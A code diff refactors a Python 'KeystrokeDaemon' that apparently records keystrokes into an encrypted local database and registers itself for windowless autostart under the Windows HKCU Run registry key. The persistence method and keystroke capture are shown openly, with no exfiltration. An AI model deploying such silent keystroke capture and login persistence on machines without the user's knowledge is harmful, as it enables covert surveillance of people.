@@ -8,7 +8,7 @@ import win32ts
 import keyring
 from sqlcipher3 import dbapi2 as sqlite
 
-from constants import APP_NAME, BASELINE_TABLE_PREFIX, DB_FILE, DIR_NAME, KEYRING_USER_KEY
+from constants import APP_NAME, AUTOSTART_REGISTRY_PATH, BASELINE_TABLE_PREFIX, DB_FILE, DIR_NAME, KEYRING_USER_KEY
 from coordinator import KeystrokeCoordinator
 
 class KeystrokeDaemon:
@@ -20,16 +20,14 @@ class KeystrokeDaemon:
         self.main_script_path = main_script_path
 
     def setup_autostart(self):
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        app_name = APP_NAME
         
         python_exe = sys.executable.replace("python.exe", "pythonw.exe")
         command = f'"{python_exe}" "{self.main_script_path}"'
 
         try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
-            winreg.CloseKey(key)
+            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_REGISTRY_PATH, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, command)
+            winreg.CloseKey(reg_key)
             print("[+] Autostart successfully configured in Registry.")
         except Exception as e:
             print(f"[!] Autostart configuration error: {e}")
